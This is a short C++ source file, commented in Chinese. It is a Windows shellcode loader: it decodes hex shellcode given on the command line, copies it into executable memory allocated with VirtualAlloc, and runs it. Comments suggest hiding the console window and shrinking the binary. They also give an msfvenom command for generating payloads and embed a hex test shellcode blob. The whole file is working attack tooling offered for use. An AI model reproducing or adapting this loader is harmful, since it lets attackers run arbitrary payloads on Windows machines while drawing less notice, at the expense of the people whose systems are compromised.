#include "windows.h"  
#include "stdio.h"  
#include <iostream>
#include <ctgmath>
#include <string>
using namespace std;
//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口  
//#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//减小编译体积  
//shellcode在生成payload时选择c即可  
//msfvenom -p windows/exec CMD=calc.exe -f c 
//测试shellcode（执行cmd）：bf6e4a2508d9ebd97424f45d33c9b131317d13037d1383c56aa8d0f49aae1b055acf92e06bcfc161dbff8224d774c6dc6cf8cfd3c5b729ddd6e40a7c54f75e5e6538939fa2255ecd7b21cde2087fce894291566d1290772029cb57c2fe67dedce342a857d7392bbe26c180ff8730d8382fabaf304c56a8862f8c3d1d9747e5f9268b70892460f6d52877db6d54fcdaa1dd46f965861d603f62f39d5fcdac3b2be3b93176693fc70cdf3fd70e4f28e685002ff74f65cf155a9378800f1ee533fa5c10b00f1ce7a86519a36e9553bc1a99c0bd0efa872dd2d322d6712c
//20210131更新,修复bug

string convert_ASCII(string hex) {
    string ascii = "";
    for (size_t i = 0; i < hex.length(); i += 2) {
        //taking two characters from hex string
        string part = hex.substr(i, 2);
        //changing it into base 16
        char ch = stoul(part, nullptr, 16);
        //putting it into the ASCII string
        ascii += ch;
    }
    return ascii;
}


int main(int argc, char* argv[])
{
    string in = argv[1];
    string shellcode_str = convert_ASCII(in);
    int len = in.length();
    unsigned char shellcode[1024] = {0};
    memcpy(shellcode, shellcode_str.c_str(), len / 2 + 1);
    LPVOID Memory = VirtualAlloc(NULL, len / 2 + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, shellcode, len / 2 + 1);
    //运行
    ((void(*)())Memory)();
    return 0;
}